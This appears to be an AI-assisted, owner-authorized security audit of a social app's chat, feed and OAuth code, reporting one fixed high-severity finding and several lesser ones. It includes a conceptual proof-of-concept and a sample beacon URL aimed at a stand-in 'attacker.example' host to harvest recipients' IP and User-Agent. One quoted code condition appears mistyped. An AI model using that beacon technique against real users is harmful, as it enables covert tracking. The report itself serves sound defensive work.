# Security Audit — NigerConnect (Mode A, post-push)

- **Date:** 2026-06-08
- **Scope:** pushed range `HEAD~6..HEAD` (chat edit/delete + image preview/lightbox/download, private-profile exclusion from feed/search, 3-level comment nesting + cascade delete, fluidity/UI pass) plus the immediately-preceding auth/privacy commits `045a7c3` / `6807259` (OAuth verified-by-default + stub-link) which the brief explicitly placed in scope.
- **Deep-dive:** `apps/api/src/chat/*`, `apps/api/src/feed/{posts,comments}.service.ts`, OAuth account-linking in `apps/api/src/auth/auth.service.ts`, mobile chat screen/services.
- **Referentials:** OWASP Top 10 2021, OWASP API Security Top 10 2023, CWE, CVSS v3.1 (estimated).
- **Authorization:** owner-authorized defensive pentest. No destructive tests. Prod touched only with safe, single requests (status-code probes via `docker exec ... wget`). No prod data mutated, no spam accounts.

---

## Findings

### [HIGH] Chat `mediaUrl` is persisted unvalidated — arbitrary off-platform URL injection + cross-tenant object reference — OWASP A01 / API1 / A10, CWE-639 / CWE-918-adjacent (CVSS 7.1)
- **Where:** `apps/api/src/chat/chat.service.ts:240-249` (pre-fix), `apps/api/src/chat/dto/chat.dto.ts:12`, gateway path `apps/api/src/chat/chat.gateway.ts:151-196`.
- **Evidence:** `sendMessage` persisted `mediaUrl: payload.mediaUrl ?? null` directly. The only validation was the Zod `z.string().url().max(500)` in `sendMessageSchema`. Unlike posts/stories, which bind every client URL to the platform bucket via `S3Service.assertOwnedPublicImage(url, ownerId)` (`apps/api/src/feed/posts.service.ts:67` and `:100`), chat never imported `S3Service` (`apps/api/src/chat/chat.module.ts` had no `StorageModule`/S3 provider). The shipped e2e even demonstrates an arbitrary URL succeeding: `e2e/tests/api/chat-edit-delete.spec.ts:328` sends `mediaUrl: 'https://cdn.nigerconnect.test/e2e/test-image.jpg'`.
- **Impact:** Any authenticated user can attach an arbitrary URL to a message delivered to every conversation member. Recipients' clients auto-load it as `<Image source={{uri}}>` (`apps/mobile/app/chat/[id].tsx`), so an attacker-controlled host (`https://attacker.example/track.gif?u=victim`) harvests each recipient's IP/User-Agent/online-timing (deanonymization / tracking beacon). It also lets a sender reference objects not bound to their own `users/<id>/` prefix, breaking the per-user ownership invariant that posts enforce. The API does not fetch the URL itself, so there is no server-side SSRF; the impact is client-side privacy/integrity, hence HIGH not CRITICAL.
- **PoC (safe, conceptual):** `POST /api/conversations/<id>/messages {"messageType":"image","mediaUrl":"https://attacker.example/x.gif"}` → message stored verbatim and broadcast; every member's client GETs `attacker.example`.
- **Fix:** APPLIED. Injected the already-`@Global()` `S3Service` into `ChatService` and bound `mediaUrl` through `assertOwnedPublicImage(url, userId)` in `sendMessage` — identical to the posts/stories guard. Media-bearing types now require a valid owned URL; text messages reject a `mediaUrl`; media types without a `mediaUrl` are rejected. The canonical CDN URL (not the raw client URL) is persisted. Covers both the REST and WebSocket gateway send paths (both call `ChatService.sendMessage`).
  - `apps/api/src/chat/chat.service.ts` — import + constructor injection + validation block before persistence; persist `cleanMediaUrl`.
- **Verified:**
  - `npx jest src/chat/chat.service.spec.ts` → 12 passed (was 8 passed / 1 failed). New regression tests:
    - "binds a media message URL to the sender via assertOwnedPublicImage and persists the canonical URL" — asserts the guard is called with `(rawUrl, 'me')` and the canonical URL is stored, not the attacker URL.
    - "rejects a media message whose URL is not an owned platform object" — `BadRequestException`, no DB write.
    - "refuses to send a media message type with no mediaUrl" — `BadRequestException`.
  - `npx tsc --noEmit` (apps/api) → clean.
- **Note (proposed follow-up, NOT applied):** the e2e `chat-edit-delete.spec.ts:324-328` now describes pre-fix behavior; with the fix it will need the test to first upload via the presign flow (as the posts e2e does) or be marked to expect a 400 for a foreign URL. Left for the human since editing e2e fixtures touches the live-storage gating.
- **Ref:** https://owasp.org/Top10/A01_2021-Broken_Access_Control/ · https://cwe.mitre.org/data/definitions/639.html

### [MEDIUM] Shipped unit test contradicts intended edit behavior — failing test on default branch (CI integrity) — CWE-1164 (CVSS 4.0, non-exploitable)
- **Where:** `apps/api/src/chat/chat.service.spec.ts:73-90` (pre-fix), added in `eea8f32`; implementation `editMessage` added in `4d45c07` (`apps/api/src/chat/chat.service.ts:355-388`).
- **Evidence:** The test "refuses to edit a non-text message" mocked `messageType: 'image'` and expected a `BadRequestException`. But `editMessage` *intentionally allows* editing image captions (`messageType !== 'text' && messageType !== 'text'` → only non-text/non-image is refused; DTO comment in `dto/chat.dto.ts:21-23` confirms image-caption edits are by design). The test therefore fell through to `prisma.message.update` on a mock returning `undefined`, then `syncPreview` dereferenced an undefined Prisma method → `TypeError`. Result: `jest` reported 1 failing test on the pushed code.
- **Impact:** No runtime vulnerability, but a red test on the default branch erodes the security signal of the suite (a real future regression could hide behind an already-red run) and breaks CI gating.
- **Fix:** APPLIED. Re-pointed the test at the genuine non-editable boundary (`messageType: 'file'` → `BadRequestException`, no DB write), which is the actual security rule. Threaded the new `S3Service` mock through all `ChatService` constructions in the spec.
- **Verified:** `npx jest src/chat/chat.service.spec.ts` → 12 passed; `npx tsc --noEmit` clean.
- **Ref:** https://cwe.mitre.org/data/definitions/1164.html

### [INFO/LOW] WebSocket `message:read` / `typing:*` payloads not Zod-validated — CWE-20 (CVSS 2.0)
- **Where:** `apps/api/src/chat/chat.gateway.ts:198-255`.
- **Evidence:** Unlike `message:send` (which runs `socketSendMessageSchema.parse`), `onRead`/`onTypingStart`/`onTypingStop` consume `payload.conversationId` untyped. A non-UUID id reaches Prisma `findUnique` on a composite key in `markAsRead`.
- **Impact:** None exploitable — `onRead` wraps the call in try/catch and swallows (logs + returns), `typing:*` first gates on `client.rooms.has('conv:'+id)`, and membership is still asserted server-side. No crash, no leak, no IDOR. Noted only for input-validation consistency.
- **Fix:** PROPOSED (not applied — no security impact): validate `{ conversationId: z.string().uuid() }` at the top of these handlers to reject malformed ids early, mirroring `message:send`.
- **Ref:** https://cwe.mitre.org/data/definitions/20.html

### [INFO] Comment content not control-char sanitized (chat is) — by-design, documented — A03
- **Where:** `apps/api/src/feed/comments.service.ts:62-71` / `:155-159` persist raw `content`; chat strips C0/C1 + bidi/zero-width via `sanitizeMessageText`.
- **Evidence/assessment:** Content is Zod-bounded (`createCommentSchema` min 1 / max 1000, `apps/api/src/feed/dto/post.dto.ts:27-29`) and rendered as text by the RN client (no HTML sink — confirmed no `dangerouslySetInnerHTML` anywhere in `apps`). The codebase's documented stance is "escape at the RENDER layer, not write time." Not a finding for the mobile client; the future web client must escape at render. No action.

---

## Areas reviewed and found SOUND (no finding)

- **Chat IDOR / ownership:** `assertMember` gates every read/list/send/markRead; `softDeleteMessage`/`editMessage` enforce `senderId === userId` + a 15-min window (`MESSAGE_MUTATION_WINDOW_MS`); soft-delete nulls `content`+`mediaUrl`. `replyToId` is verified to be a live message *in the same conversation* (`chat.service.ts:220-228`) — blocks cross-conversation thread leakage.
- **Chat block enforcement:** `createConversation` refuses across a block; `sendMessage` re-checks blocks on direct convos for the post-block membership-row case.
- **WebSocket presence scoping:** `user:online`/`offline` emitted only to shared `conv:` rooms (not the whole namespace) — no presence leak to strangers (`chat.gateway.ts:132-143`). JWT verified RS256 with `iss`/`aud` and current+previous key rotation; rate-limit is Redis-keyed per *user* (survives reconnect), 30/60s.
- **Feed/post privacy (the push's headline change):** `assertCanViewPost` is the single authoritative gate used by single-post/comments/share; returns 404 (not 403) to avoid existence disclosure; private profiles' public posts are excluded from the global feed (`posts.service.ts:347`), from `getUserPosts` (`:414-419`), and from the single-post/comment side channels (`:171`). Association posts gated on approved membership, not friendship. Share restricted to public posts.
- **Comment nesting/cascade:** depth capped at 3 via ancestor walk; cascade soft-delete collects the live subtree and decrements `commentCount` by the exact count in one transaction — no orphans, no count drift. Authorship enforced on edit/delete; visibility re-checked on create/list.
- **OAuth verified-by-default + stub-link (`045a7c3`/`6807259`):** account-takeover guard intact — auto-link requires `profile.emailVerified === true` AND no existing password AND no conflicting provider (`auth.service.ts:404-428`); otherwise `ConflictException`. New-account `emailVerified: true` is justified (Google rejects unverified upstream; Apple proves ownership). PII kept out of logs (SHA-256 prefix). No finding.
- **S3 presign guard (`assertOwnedPublicImage`):** strong — `parsePublicKey` rejects foreign hosts, private bucket, traversal (`..`, `//`, leading `/`), query/fragment stripped; HEAD-verifies existence, content-type allowlist (jpeg/png/webp/heic), 15 MB cap; owner-prefix binding.
- **SAST:** no hardcoded secrets in the diff; no `eval`/`Function`/`child_process` in app code; the only `$queryRawUnsafe` is a constant literal `'TRUE'` (no interpolation). Helmet enabled, CORS from explicit env origins with `credentials: false`.
- **Prod safe checks:** `GET /api/conversations` (no token) → **401** (auth guard live). `/api/` and `/api/health` → 404 from busybox wget capture (header detail not retrievable via busybox on non-2xx; helmet config confirmed in `main.ts:50`). No flooding; ≤4 total requests.

---

## Standing items (pre-existing, NOT introduced by this push)

- **[A06] Dependency advisories:** `pnpm audit --prod` → 67 vulns (28 high), dominated by an `axios` cluster (header injection / proxy-auth leak / ReDoS), `multer` DoS, and a `next` advisory (GHSA-vfv6-92ff-j949). None are in this push's diff (the only dep changes were mobile `@expo/vector-icons` + `expo-media-library`, both legitimate UI/feature deps). Recommend a separate remediation pass — does not block this push.
- **[Tooling] `comments.service.spec.ts` OOMs jest** (heap limit) in this Windows runner even `--runInBand --max-old-space-size=2048`; the 12 tests that executed passed. Unrelated to the audited changes (comments logic untouched). Flag for CI memory tuning.

---

## Summary

### by_severity
| Severity | Count | Items |
|---|---|---|
| critical | 0 | — |
| high | 1 | Chat `mediaUrl` unvalidated (FIXED) |
| medium | 1 | Stale/failing chat edit test (FIXED) |
| low/info | 2 | WS `message:read` no Zod (proposed); comment sanitization (by-design) |

### Fixes APPLIED (in working tree, NOT committed, with green proof)
1. **Chat `mediaUrl` host-binding** — `apps/api/src/chat/chat.service.ts`. Proof: `jest src/chat/chat.service.spec.ts` 12/12 green (3 new regression tests) + `tsc --noEmit` clean.
2. **Chat edit test correctness** — `apps/api/src/chat/chat.service.spec.ts`. Proof: same green run (was 8/1-fail before).

### Fixes PROPOSED (not applied — left for human review)
- Zod-validate `message:read` / `typing:*` socket payloads (consistency only; no impact).
- Update e2e `chat-edit-delete.spec.ts` image step to use the presign upload flow (or expect 400 for a foreign URL) now that chat enforces owned media — touches live-storage gating.
- Schedule the `axios`/`multer`/`next` dependency remediation pass (A06).

### Verdict
**OK_TO_DEPLOY** — the one HIGH finding introduced by this push (unvalidated chat `mediaUrl`) is fixed and proven; the MEDIUM CI-integrity issue is fixed. Remaining items are pre-existing/low and do not block. Caveat: before merging, update the in-range e2e (`chat-edit-delete.spec.ts` image case) so it does not send a foreign `mediaUrl` against the now-enforcing endpoint.
